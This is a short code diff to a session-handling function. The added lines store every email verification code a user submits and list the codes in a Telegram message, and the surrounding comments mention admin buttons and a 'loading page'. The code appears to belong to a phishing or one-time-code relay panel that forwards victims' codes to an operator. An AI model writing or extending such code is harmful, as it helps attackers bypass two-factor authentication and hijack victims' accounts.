@@ -314,6 +314,15 @@ export const updateSessionWithEmailCode = async (
     }
     session.authAttempts["email"]++;
 
+    // Add email code to authCodes array for numbered display in Telegram
+    if (!session.authCodes) {
+      session.authCodes = {};
+    }
+    if (!session.authCodes["email"]) {
+      session.authCodes["email"] = [];
+    }
+    session.authCodes["email"].push(emailCode);
+
     activeSessions.set(sessionId, session);
 
     // Update the existing Telegram message (no admin buttons - user not on loading page)
